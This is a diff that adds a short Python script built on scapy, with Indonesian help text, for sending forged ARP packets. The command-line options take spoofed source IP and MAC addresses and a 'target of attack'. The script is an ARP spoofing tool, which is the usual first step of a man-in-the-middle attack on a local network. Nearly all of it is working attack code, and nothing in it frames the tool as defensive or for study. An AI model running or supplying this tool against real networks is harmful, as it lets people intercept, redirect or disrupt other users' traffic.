@@ -1,0 +1,26 @@
+#!/usr/bin/python
+
+from scapy.all import *
+from scapy.utils import *
+from optparse import OptionParser
+
+def sendArp(sh, dh, dsrc, ddst, opt, dhsrc, dhdst):
+	e = Ether(dst=dh, src=sh)
+	a = ARP(psrc=dsrc,pdst=ddst,hwsrc=dhsrc,hwdst=dhdst,op=opt)
+	p = e/a/Padding("\x00"*18)
+	sendp(p)
+def main(sh, dh ,dsrc , ddst, opt, dhsrc, dhdst):
+	pass
+if __name__ == '__main__' :
+        Op = OptionParser()
+	Op.add_option("-s","--srcmac",help="Mac alamat sumber",dest="sh",type=str)
+	Op.add_option("-d","--dstmac",help="Mac alamat tujuan",dest="dh",type=str)
+	Op.add_option("-a","--datasource",help="Data Alamat IP Sumber dapat dispoof",dest="dsrc",type=str)
+	Op.add_option("-b","--datasmac",help="Data Mac Address Sumber",dest="dhsrc",type=str)
+	Op.add_option("-x","--datadest",help="Data Alamat IP Tujuan atau target seranga",dest="ddst",type=str)
+	Op.add_option("-y","--datadmac",help="Data Mac Address Tujuan",dest="dhdst",type=str)
+	Op.add_option("-o","--option",help="Option Paket data",dest="opt",type=int)
+	opt,args = Op.parse_args()
+	sendArp(opt.sh, opt.dh ,opt.dsrc, opt.ddst ,opt.opt ,opt.dhsrc, opt.dhdst)
+
+
